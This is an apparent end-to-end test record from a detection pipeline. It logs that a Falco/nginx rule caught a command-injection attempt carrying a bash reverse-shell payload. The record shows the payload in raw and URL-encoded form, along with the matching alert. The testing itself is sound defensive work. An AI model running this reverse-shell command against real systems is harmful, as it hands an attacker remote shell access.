name: test_e2e_with_logs[232_CMD_REVSH_001]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_001` |
| **Name** | Bash reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
- **Encoded**: `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 09:37:25.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1767433045376-fje20p pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1

**Falco Log Entry**:
```
09:37:25.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1767433045376-fje20p pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1
```
